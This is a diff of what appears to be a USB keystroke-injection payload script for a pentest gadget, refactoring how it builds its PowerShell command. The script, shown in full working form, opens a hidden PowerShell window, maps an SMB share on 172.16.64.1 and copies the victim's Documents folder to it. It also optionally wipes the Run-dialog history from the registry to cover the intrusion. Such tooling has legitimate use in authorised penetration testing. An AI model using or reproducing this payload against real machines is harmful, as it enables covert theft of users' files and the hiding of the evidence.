@@ -25,13 +25,18 @@ CLEARTRACKS="yes" # yes or no
 # Initialization
 LED R G 100
 
-# Define powershell payload
-PAYLOAD="While(!(TNC 172.16.64.1 SMB -I quiet)){};net use \\\172.16.64.1\e PWD /USER:USER;robocopy \$HOME\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S"
-
 # Check for impacket. If not found, blink fast red.
 if [ ! -d /pentest/impacket/ ]; then
   LED R 100
   exit 1
+fi
+
+# Define powershell payload
+PAYLOAD="While(!(TNC 172.16.64.1 SMB -I quiet)){};net use \\\172.16.64.1\e PWD /USER:USER;robocopy \$HOME\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S"
+
+# If cleartracks add the code to the powershell payload
+if [ $CLEARTRACKS == "yes" ]; then
+  PAYLOAD="${PAYLOAD};rp 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -N '*'"
 fi
 
 
@@ -41,24 +46,11 @@ fi
 LED R G
 ATTACKMODE HID
 
-# Clear tracks = yes
-if [ $CLEARTRACKS == "yes" ]; then
-   QUACK Delay 500
-   QUACK GUI r
-   QUACK DELAY 500
-   QUACK STRING "PowerShell -W Hidden \"${PAYLOAD}\;rp 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -N '*'\""
-   QUACK ENTER
-fi
-
-# Clear tracks = no
-if [ $CLEARTRACKS == "no" ]; then
-   QUACK DELAY 500
-   QUACK GUI r
-   QUACK DELAY 500
-   QUACK STRING "PowerShell -W Hidden \"${PAYLOAD}\""
-   QUACK ENTER
-fi
-
+QUACK Delay 500
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING "PowerShell -W Hidden \"${PAYLOAD}\""
+QUACK ENTER
 
 # ETHERNET STAGE
 LED R B 100
